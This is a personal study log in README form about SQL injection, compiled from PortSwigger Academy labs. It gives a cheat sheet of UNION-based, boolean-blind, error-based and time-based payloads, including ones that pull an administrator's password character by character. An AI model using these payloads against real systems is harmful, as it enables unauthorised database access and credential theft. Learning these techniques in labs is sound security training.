# My-Security-Log-1-SQLi
This repository contains my public notes regarding my experiences with the SQLi topic on PortSwigger Academy.

**Date:** January 3, 2026  
**Source:** PortSwigger Academy & Personal Study Notes

---

## Research Overview
SQL Injection remains one of the most critical web vulnerabilities. During this lab series, I systematized various discovery and exploitation methods — ranging from classic `UNION-based` techniques to stealthy `Time-based` vectors.

### 1. Structural Reconnaissance (Union-Based)
* The initial step involves determining the number of columns using the `' ORDER BY X--` technique.
* Column types are then verified by injecting `UNION SELECT NULL` to find fields that accept string data. This is crucial for successful data exfiltration.

### 2. Database Fingerprinting
The payload syntax varies significantly across database management systems:
* **Oracle:** `UNION SELECT banner, NULL FROM v$version--`.
* **MySQL:** `UNION SELECT @@version, NULL #`.
* **MSSQL:** `UNION SELECT @@version, NULL--`.
* **PostgreSQL:** `UNION SELECT version(), NULL--`.

### 3. Data Enumeration
To map the database schema, I utilize system catalogs:
* **PostgreSQL/MySQL:** Querying `information_schema.tables` and `information_schema.columns`.
* **Oracle:** Querying `all_tables` and `all_tab_columns`.

---

## Technical Cheat Sheet

### Blind SQLi (Boolean-based)
* **Table Validation:** `' AND (SELECT 'a' FROM users LIMIT 1)='a`.
* **Character Brute-force:** `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`.

### Error-based Injection
* **Output Test:** `' AND CAST((SELECT 1) AS int)--`.
* **Data Leakage via Errors:** `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`.

### Time-based Delays
* **Baseline Test (Postgres):** `'||pg_sleep(10)--`.
* **Conditional Exploitation:** `SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`.

---

## Personal Insights & Conclusions

> **Author's Perspective:**
> SQLi is a formidable vulnerability class. When developers fail to implement rigorous input validation, the security implications are severe: any form of SQLi can lead to a full database compromise. In worst-case scenarios, it serves as a stepping stone for **Reverse Shells**, **Privilege Escalation**, and total server takeover (running a DB service with elevated privileges is a recipe for disaster). 
>
> If I were on the **Blue Team**, I would move away from fragile blacklists or manual sanitization in favor of **Prepared Statements** (parameterized queries). This ensures that user input is never executed as code. As a **Junior Red Team specialist**, I now have a solid grasp of the underlying logic and exploitation vectors. Notes finalized.

---

## Future Roadmap
* **XSS (Cross-Site Scripting):** I understand the general pattern; time to dive into the advanced nuances and bypasses.

---
*Notes compiled based on PortSwigger Academy research materials.*
